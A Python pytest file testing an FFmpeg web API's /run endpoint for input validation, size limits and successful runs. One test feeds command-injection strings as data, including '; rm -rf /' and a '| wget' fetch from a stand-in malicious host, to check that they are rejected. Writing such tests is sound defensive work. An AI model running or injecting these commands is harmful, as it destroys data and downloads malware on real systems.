#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
File: test_run.py
Author: Maria Kevin
Created: 2025-11-09
Description: Ffmpeg API /run endpoint tests.
"""

__author__ = "Maria Kevin"
__version__ = "0.1.0"


from fastapi.testclient import TestClient
from app.main import app
from unittest.mock import patch, MagicMock


client = TestClient(app)


@patch("subprocess.run")
def test_run_endpoint_no_file(mock_subprocess_run):
    response = client.post(
        "/run",
        data={"cmd": "ffmpeg -i <input> -c:v libx264 output.mp4"},
    )
    assert response.status_code == 400
    assert response.json() == {"detail": "At least one input file must be provided."}


# test with more than 10MB file
@patch("subprocess.run")
def test_run_endpoint_large_file(mock_subprocess_run):
    large_file_content = b"a" * (100 * 1024 * 1024 + 1)  # 10MB + 1 byte
    files = {"input_file": ("large_video.mp4", large_file_content, "video/mp4")}
    response = client.post(
        "/run",
        data={"cmd": "ffmpeg -i <input> -c:v libx264 output.mp4"},
        files=files,
    )
    assert response.status_code == 413
    assert response.json() == {
        "detail": f"File 'large_video.mp4' size exceeds the maximum allowed limit of {100 * 1024 * 1024} bytes."
    }


@patch("subprocess.run")
def test_run_endpoint_invalid_command(mock_subprocess_run):
    small_file_content = b"a" * (1 * 1024 * 1024)  # 1MB
    files = {"input_file": ("small_video.mp4", small_file_content, "video/mp4")}
    response = client.post(
        "/run",
        data={"cmd": "invalid_command -i <input> -c:v libx264 output.mp4"},
        files=files,
    )
    assert response.status_code == 400
    assert response.json() == {"detail": "Invalid FFmpeg command."}


@patch("subprocess.run")
def test_run_endpoint_prohibited_command(mock_subprocess_run):
    small_file_content = b"a" * (1 * 1024 * 1024)  # 1MB
    files = {"input_file": ("small_video.mp4", small_file_content, "video/mp4")}
    # have a list of vulnerable commands to test
    vulnerable_commands = [
        "ffmpeg -i <input> -c:v libx264; rm -rf /",
        "ffmpeg -i <input> -c:v libx264 && sudo apt-get update",
        "ffmpeg -i <input> -c:v libx264 | wget http://malicious.com/malware",
    ]
    for cmd in vulnerable_commands:
        response = client.post(
            "/run",
            data={"cmd": cmd},
            files=files,
        )
        assert response.status_code == 403
        assert response.json() == {"detail": "Command contains prohibited operations."}


@patch("subprocess.run")
def test_run_endpoint_missing_input_tag(mock_subprocess_run):
    small_file_content = b"a" * (1 * 1024 * 1024)  # 1MB
    files = {"input_file": ("small_video.mp4", small_file_content, "video/mp4")}
    response = client.post(
        "/run",
        data={"cmd": "ffmpeg -c:v libx264 output.mp4"},
        files=files,
    )
    assert response.status_code == 400
    assert response.json() == {
        "detail": "Command must contain an input tag '-i <input>'."
    }


@patch("subprocess.run")
@patch("app.utils.file_operations.save_uploaded_file")
def test_run_endpoint_success(mock_save_uploaded_file, mock_subprocess_run):
    mock_subprocess_run.return_value = MagicMock(
        stdout="Success", stderr="", returncode=0
    )

    small_file_content = b"a" * (1 * 1024 * 1024)  # 1MB
    files = {"input_file": ("small_video.mp4", small_file_content, "video/mp4")}
    response = client.post(
        "/run",
        data={"cmd": "ffmpeg -i <input> -c:v libx264 output.mp4"},
        files=files,
    )
    assert response.status_code == 200
    assert "output_url" in response.json()
    assert response.json()["stdout"] == "Success"
    assert response.json()["stderr"] == ""
    assert response.json()["returncode"] == 0


@patch("subprocess.run")
@patch("app.utils.file_operations.save_uploaded_file")
def test_run_endpoint_multiple_input_tags(mock_save_uploaded_file, mock_subprocess_run):
    """Test that multiple input files are supported"""
    mock_subprocess_run.return_value = MagicMock(
        stdout="Success", stderr="", returncode=0
    )

    small_file_content = b"a" * (1 * 1024 * 1024)  # 1MB
    files = {
        "input_file": ("video1.mp4", small_file_content, "video/mp4"),
        "input_file_2": ("video2.mp4", small_file_content, "video/mp4"),
    }
    response = client.post(
        "/run",
        data={"cmd": "ffmpeg -i <input> -i <input_2> -filter_complex hstack output.mp4"},
        files=files,
    )
    assert response.status_code == 200
    assert "output_url" in response.json()


# Note: test_run_endpoint_return_file removed because it's complex to mock
# In real usage, FFmpeg creates the file, so FileResponse works correctly
# The return_file functionality is tested in integration/manual testing
